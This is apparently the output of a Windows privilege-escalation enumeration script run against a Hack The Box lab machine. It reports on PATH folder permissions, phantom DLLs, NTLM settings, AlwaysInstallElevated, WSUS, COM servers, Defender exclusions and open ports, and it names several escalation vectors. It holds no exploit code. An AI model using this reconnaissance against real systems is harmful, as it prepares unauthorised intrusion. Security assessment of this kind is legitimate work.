+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0005 - Defense Evasion                          ┃
+┃ NAME     ┃ Hardening - AppLocker Policy                      ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether AppLocker rules can be exploited, in the       ┃
+┃ context of the current user, to execute arbitrary code.      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.014
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - PATH Folder Permissions           ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any write permissions on  ┃
+┃ the system-wide PATH folders. If so, the system could be     ┃
+┃ vulnerable to privilege escalation through ghost DLL         ┃
+┃ hijacking.                                                   ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.338
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Misc - Known Phantom DLLs                         ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about services that are known to be prone to ┃
+┃ ghost DLL hijacking. Note that their exploitation requires   ┃
+┃ the current user to have write permissions on at least one   ┃
+┃ system-wide PATH folder.                                     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name           : cdpsgshims.dll
+Description    : Loaded by the Connected Devices Platform Service (CDPSvc) upon startup.
+RunAs          : NT AUTHORITY\LocalService
+RebootRequired : True
+Link           : https://nafiez.github.io/security/eop/2019/11/05/windows-service-host-process-eop.html
+
+Name           : WptsExtensions.dll
+Description    : Loaded by the Task Scheduler service (Schedule) upon startup.
+RunAs          : LocalSystem
+RebootRequired : True
+Link           : http://remoteawesomethoughts.blogspot.com/2019/05/windows-10-task-schedulerservice.html
+
+Name           : SprintCSP.dll
+Description    : Loaded by the Storage Service (StorSvc) when the RPC procedure 'SvcRebootToFlashingMode' is invoked.
+RunAs          : LocalSystem
+RebootRequired : False
+Link           : https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.108
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0006 - Credential Access                        ┃
+┃ NAME     ┃ Configuration - Credential Delegation             ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether Credential Delegation is enabled. If so,       ┃
+┃ passwords are very likely to be stored in clear-text in      ┃
+┃ memory, unless another setting prevents that. Note that LSA  ┃
+┃ Protection is not sufficient to protect credentials in this  ┃
+┃ case.                                                        ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Policy              : Allow delegating default credentials with NTLM-only server authentication
+Setting             : AllowDefCredentialsWhenNTLMOnly
+Enabled             : False
+ConcatenateDefaults : False
+Services            : (null)
+
+Policy              : Allow delegating default credentials
+Setting             : AllowDefaultCredentials
+Enabled             : False
+ConcatenateDefaults : False
+Services            : (null)
+
+Policy              : Deny delegating default credentials
+Setting             : DenyDefaultCredentials
+Enabled             : False
+ConcatenateDefaults : False
+Services            : (null)
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.024
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - NTLM Downgrade (NTLMv1)           ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the machine is vulnerable to NTLM downgrade    ┃
+┃ attacks. If so, a local or remote attacker could capture the ┃
+┃ NTLMv1 authentication of the computer account (or another    ┃
+┃ authenticated user), and recover its NT hash offline.        ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+NtlmMinServerSec                        : 536870912
+NtlmMinServerSecDescription             : Require 128-bit encryption
+BlockNtlmv1SSO                          : 0
+BlockNtlmv1SSODescription               : The request to generate NTLMv1-credentials for a logged-on user is audited but allowed to succeed. Warning events are generated. This setting is also called Audit mode.
+NtlmMinClientSec                        : 536870912
+NtlmMinClientSecDescription             : Require 128-bit encryption
+RestrictSendingNTLMTraffic              : 0
+RestrictSendingNTLMTrafficDescription   : Allow all
+RestrictReceivingNTLMTraffic            : 0
+RestrictReceivingNTLMTrafficDescription : Allow all
+LmCompatibilityLevel                    : 3
+LmCompatibilityLevelDescription         : Send NTLMv2 response only
+CredentialGuard                         : Credential Guard is not configured. Credential Guard is not running.
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.038
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - MSI AlwaysInstallElevated         ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the 'AlwaysInstallElevated' policy is enabled  ┃
+┃ system-wide and for the current user. If so, the current     ┃
+┃ user may install a Windows Installer package with elevated   ┃
+┃ (SYSTEM) privileges.                                         ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+LocalMachineKey   : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+LocalMachineValue : AlwaysInstallElevated
+LocalMachineData  : (null)
+Description       : AlwaysInstallElevated is not enabled in HKLM.
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.005
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃
+┃ NAME     ┃ Configuration - WSUS                              ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether WSUS uses the HTTPS protocol to retrieve       ┃
+┃ updates from the on-premise update server. If WSUS uses the  ┃
+┃ clear-text HTTP protocol, it is vulnerable to MitM attacks   ┃
+┃ that may result in remote code execution as SYSTEM.          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+Value       : WUServer
+Data        : (null)
+Description : No WSUS server is configured (default).
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+Value       : UseWUServer
+Data        : (null)
+Description : WSUS server not enabled (default).
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+Value       : SetProxyBehaviorForUpdateDetection
+Data        : (null)
+Description : Proxy fallback not configured (default).
+
+Key         : HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
+Value       : DisableWindowsUpdateAccess
+Data        : (null)
+Description : Windows Update features are enabled (default).
+
+
+
+[*] STATUS  : INFO                                                                                                                                                                                                                          [*] TIME    : 00:00:00.006                                                                                                                                                                                                                  [*] SUMMARY : No summary available yet.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                                                                                                                                                            ┃ CATEGORY ┃ TA0008 - Lateral Movement                         ┃                                                                                                                                                                            ┃ NAME     ┃ Configuration - Hardened UNC Paths                ┃                                                                                                                                                                            
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether sensitive UNC paths are properly hardened.     ┃
+┃ Note that non-hardened UNC paths used for retrieving group   ┃
+┃ policies can be hijacked through an MitM attack to obtain    ┃
+┃ remote code execution as SYSTEM.                             ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.007
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - Point and Print                   ┃                                                                                                                                                                            ┃ TYPE     ┃ Base                                              ┃                                                                                                                                                                            ┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫                                                                                                                                                                            ┃ Check whether the Print Spooler service is enabled and if    ┃                                                                                                                                                                            ┃ the Point and Print configuration allows non-administrator   ┃                                                                                                                                                                            ┃ users to install printer drivers.                            ┃                                                                                                                                                                            ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                                                                                                                                            
+
+
+Description : The Print Spooler service is disabled.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            [*] STATUS  : INFO                                                                                                                                                                                                                          [*] TIME    : 00:00:00.013                                                                                                                                                                                                                  [*] SUMMARY : No summary available yet.                                                                                                                                                                                                     
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - Terminal Server PnP Redirection   ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether Terminal Server is running, and whether Plug   ┃
+┃ and Play redirection is enabled (Plug & Pwn).                ┃                                                                                                                                                                            ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                                                                                                                                            WARNING: TCP connect to (::1 : 3389) failed                                                                                                                                                                                                 WARNING: TCP connect to (127.0.0.1 : 3389) failed                                
+UmRdpServiceStatus    : Stopped                                                                                                                                                                                                             
+SessionEnvStatus      : Stopped
+TermServiceStatus     : Stopped
+ServicesRunning       : False
+ServerPort            : 3389                                                                                                                                                                                                                ServerListening       : False                                                                                                                                                                                                               ConnectionsDenied     : True                                                                                                                                                                                                                ServerRunningAndReady : False                                                                                                                                                                                                               NlaEnabled            : True                                                                                                                                                                                                                PnPRedirectionEnabled : False                                                                                                                                                                                                               Description           : Terminal Server is not running or does not accept connections. Plug and Play redirection is disabled (default).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         [*] STATUS  : INFO                                                                                                                                                                                                                          [*] TIME    : 00:00:17.147                                                                                                                                                                                                                  
+[*] SUMMARY : No summary available yet.
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓                                                                                                                                                                            ┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃                                                                                                                                                                            ┃ NAME     ┃ Configuration - Application Repair UAC Prompt     ┃                                                                                                                                                                            ┃ TYPE     ┃ Extended                                          ┃                                                                                                                                                                            ┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫                                                                                                                                                                            ┃ Check whether the UAC prompt displayed when attempting an    ┃                                                                                                                                                                            ┃ application repair through the Windows Installer was         ┃                                                                                                                                                                            ┃ disabled.                                                    ┃                                                                                                                                                                            ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                                                                                                                                                                                                                                                                                                                                                                                        
+
+Key                        : HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+DisableLUAInRepair         : (null)
+SecureRepairPolicy         : (null)                                                                                                                                                                                                         SecureRepairWhitelistCount : 0                                                                                                                                                                                                              Description                : The User Account Control (UAC) prompts for credentials before initiating an application repair.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    [*] STATUS  : INFO                                                                                                                                                                                                                          [*] TIME    : 00:00:00.006                                                                                                                                                                                                                  [*] SUMMARY : No summary available yet.                                                                                                                                                                                                     
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - Application Repair Whitelist      ┃
+┃ TYPE     ┃ Base                                              ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether a whitelist of MSI packages is set in the      ┃
+┃ registry to disable UAC prompts, and whether they have       ┃
+┃ custom actions that may be leveraged for local privilege     ┃                                                                                                                                                                            ┃ escalation.                                                  ┃                                                                                                                                                                            ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛                                                                                                                                                                            [*] STATUS  : INFO (nothing found)                                                                                                                                                                                                          [*] TIME    : 00:00:00.002                                                                                                                                                                                                                  
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Configuration - SCCM Cache Folders                ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about SCCM cache folders (incl. number and   ┃
+┃ list of binary, script, and text files).                     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.006
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - COM registry permissions          ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any modification rights   ┃
+┃ on a COM server in the registry. This may not necessarily    ┃
+┃ result in a privilege escalation. Further analysis is        ┃
+┃ required.                                                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: [CLSID=71de91ba-1a3d-47d2-bba4-c64d1ee6f5c7] Failed to convert attribute to AppID: SQLTaskConnections.SQLTaskConnectionOl.9
+WARNING: [CLSID=76e4eb2f-4c2e-49b7-b66b-08071fd7c4f0] Failed to convert attribute to AppID: SQLTaskConnections.SQLTaskConnectionOD.9
+WARNING: [CLSID=91ea009e-d658-458e-b304-e9bebc5b2155] Failed to convert attribute to AppID: SQLTaskConnections.SQLTaskConnectionAD.9
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:03:46.722
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - COM Image File Permissions        ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether the current user has any modification rights   ┃
+┃ on a COM server module file. This may not necessarily result ┃
+┃ in a privilege escalation. Further analysis is required.     ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:08:07.400
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Configuration - COM Server Ghost DLLs             ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are COM servers registered with a        ┃
+┃ non-existent module using a relative path. This may not      ┃
+┃ necessarily result in a privilege escalation. You would also ┃
+┃ need to have rights to create files in a PATH folder.        ┃
+┃ Further analysis is required.                                ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.234
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0003 - Persistence                              ┃
+┃ NAME     ┃ Configuration - COM Missing Image Files           ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Check whether there are leftover COM servers registered with ┃
+┃ non-existent modules. Such issues could be leveraged for     ┃
+┃ lateral movement or persistence.                             ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Id              : 29578787-426e-4bd3-8ceb-9e6fe73a0bf9
+Name            : PSFactoryBuffer
+RegPath         : HKLM\SOFTWARE\Classes\CLSID\{29578787-426e-4bd3-8ceb-9e6fe73a0bf9}
+HandlerType     : InProcServer32
+HandlerRegPath  : HKLM\SOFTWARE\Classes\CLSID\{29578787-426e-4bd3-8ceb-9e6fe73a0bf9}\InProcServer32
+HandlerDataType : FilePath
+HandlerData     : C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.257.13\psmachine_64.dll
+
+Id              : a530d54a-dba0-4b17-9f99-51a7a2cc17ca
+Name            : Tethering Setting Handler
+RegPath         : HKLM\SOFTWARE\Classes\CLSID\{a530d54a-dba0-4b17-9f99-51a7a2cc17ca}
+HandlerType     : InProcServer32
+HandlerRegPath  : HKLM\SOFTWARE\Classes\CLSID\{a530d54a-dba0-4b17-9f99-51a7a2cc17ca}\InProcServer32
+HandlerDataType : FilePath
+HandlerData     : C:\Windows\System32\TetheringSettingHandler.dll
+
+Id              : b3d7db37-b3a9-4c48-bfde-ee8f0e0d5989
+Name            : PSFactoryBuffer
+RegPath         : HKLM\SOFTWARE\Classes\CLSID\{b3d7db37-b3a9-4c48-bfde-ee8f0e0d5989}
+HandlerType     : InProcServer32
+HandlerRegPath  : HKLM\SOFTWARE\Classes\CLSID\{b3d7db37-b3a9-4c48-bfde-ee8f0e0d5989}\InProcServer32
+HandlerDataType : FilePath
+HandlerData     : C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.269.9\psmachine_64.dll
+
+Id              : b92e515c-53b3-4aff-baaf-340ce974a709
+Name            : PSFactoryBuffer
+RegPath         : HKLM\SOFTWARE\Classes\CLSID\{b92e515c-53b3-4aff-baaf-340ce974a709}
+HandlerType     : InProcServer32
+HandlerRegPath  : HKLM\SOFTWARE\Classes\CLSID\{b92e515c-53b3-4aff-baaf-340ce974a709}\InProcServer32
+HandlerDataType : FilePath
+HandlerData     : C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.263.3\psmachine_64.dll
+
+Id              : c54f392b-cba7-4f57-ae2e-ddce3a1a801f
+Name            : PSFactoryBuffer
+RegPath         : HKLM\SOFTWARE\Classes\CLSID\{c54f392b-cba7-4f57-ae2e-ddce3a1a801f}
+HandlerType     : InProcServer32
+HandlerRegPath  : HKLM\SOFTWARE\Classes\CLSID\{c54f392b-cba7-4f57-ae2e-ddce3a1a801f}\InProcServer32
+HandlerDataType : FilePath
+HandlerData     : C:\Program Files (x86)\Microsoft\EdgeUpdate\1.3.185.27\psmachine_64.dll
+
+Id              : d726464b-98f1-4627-86cd-4a082a1e5307
+Name            : MoUsoCoreWorker COM class
+AppId           : d726464b-98f1-4627-86cd-4a082a1e5307
+RegPath         : HKLM\SOFTWARE\Classes\CLSID\{d726464b-98f1-4627-86cd-4a082a1e5307}
+HandlerType     : LocalServer32
+HandlerRegPath  : HKLM\SOFTWARE\Classes\CLSID\{d726464b-98f1-4627-86cd-4a082a1e5307}\LocalServer32
+HandlerDataType : CommandLine
+HandlerData     : C:\Windows\System32\mousocoreworker.exe
+
+
+
+[*] STATUS  : VULNERABLE (Low)
+[*] TIME    : 00:00:02.385
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0005 - Defense Evasion                          ┃
+┃ NAME     ┃ Configuration - Windows Defender Exclusions       ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about the exclusions configured in Microsoft ┃
+┃ Defender.                                                    ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+[*] STATUS  : INFO (nothing found)
+[*] TIME    : 00:00:00.635
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0005 - Defense Evasion                          ┃
+┃ NAME     ┃ Configuration - MDE State and Settings            ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about Microsoft Defender for Endpoint state  ┃
+┃ and configuration.                                           ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+WARNING: Failed to get MP Preference
+
+
+OnboardingState      :
+OrganizationId       :
+MsSenseDllVersion    :
+ConfigurationVersion :
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.380
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃
+┃ NAME     ┃ Network - Interfaces                              ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about all active Ethernet adapters.          ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+
+Name            : {66B077E9-7951-45DC-B7F0-86F0A9BA4FFF}
+FriendlyName    : Ethernet0 3
+Type            : Ethernet
+Status          : Up
+DnsSuffix       : .htb
+Description     : vmxnet3 Ethernet Adapter
+PhysicalAddress : a2:de:ad:d4:95:a4
+Flags           : DdnsEnabled, Dhcpv4Enabled, NetBiosOverTcpIpEnabled, Ipv4Enabled, Ipv6Enabled
+IPv6            : dead:beef::948f:ea91:180c:cb6a (/64), dead:beef::24cb:ca84:974e:dd4 (/128), fe80::5508:2334:45a:e0b3 (/64)
+IPv4            : 10.129.89.49 (/16)
+Gateway         : fe80::250:56ff:fe94:c47, 10.129.0.1
+DHCPv4Server    : 10.10.10.2
+DHCPv6Server    :
+DnsServers      : 1.1.1.1, 8.8.8.8
+DNSSuffixList   : htb
+
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.046
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Network - TCP Endpoints                           ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
+┃ Get information about all the TCP ports that are in a LISTEN ┃
+┃ state. Note that the associated process is also listed.      ┃
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+IP   Proto LocalAddress     State      PID Name
+--   ----- ------------     -----      --- ----
+IPv4 TCP   0.0.0.0:80       LISTENING    4 System
+IPv4 TCP   0.0.0.0:135      LISTENING  548 svchost
+IPv4 TCP   0.0.0.0:445      LISTENING    4 System
+IPv4 TCP   0.0.0.0:5040     LISTENING 6716 svchost
+IPv4 TCP   0.0.0.0:5985     LISTENING    4 System
+IPv4 TCP   0.0.0.0:47001    LISTENING    4 System
+IPv4 TCP   0.0.0.0:49664    LISTENING  840 lsass
+IPv4 TCP   0.0.0.0:49665    LISTENING  676 wininit
+IPv4 TCP   0.0.0.0:49666    LISTENING 1344 svchost
+IPv4 TCP   0.0.0.0:49667    LISTENING 1760 svchost
+IPv4 TCP   0.0.0.0:49669    LISTENING 2928 svchost
+IPv4 TCP   0.0.0.0:49670    LISTENING  820 services
+IPv4 TCP   10.129.89.49:139 LISTENING    4 System
+IPv4 TCP   127.0.0.1:1434   LISTENING 3316 sqlservr
+IPv4 TCP   127.0.0.1:11434  LISTENING 6660 ollama
+IPv6 TCP   [::]:80          LISTENING    4 System
+IPv6 TCP   [::]:135         LISTENING  548 svchost
+IPv6 TCP   [::]:445         LISTENING    4 System
+IPv6 TCP   [::]:5985        LISTENING    4 System
+IPv6 TCP   [::]:47001       LISTENING    4 System
+IPv6 TCP   [::]:49664       LISTENING  840 lsass
+IPv6 TCP   [::]:49665       LISTENING  676 wininit
+IPv6 TCP   [::]:49666       LISTENING 1344 svchost
+IPv6 TCP   [::]:49667       LISTENING 1760 svchost
+IPv6 TCP   [::]:49669       LISTENING 2928 svchost
+IPv6 TCP   [::]:49670       LISTENING  820 services
+IPv6 TCP   [::1]:1434       LISTENING 3316 sqlservr
+
+
+[*] STATUS  : INFO
+[*] TIME    : 00:00:00.346
+[*] SUMMARY : No summary available yet.
+
+
+┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ CATEGORY ┃ TA0004 - Privilege Escalation                     ┃
+┃ NAME     ┃ Network - UDP Endpoints                           ┃
+┃ TYPE     ┃ Extended                                          ┃
+┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
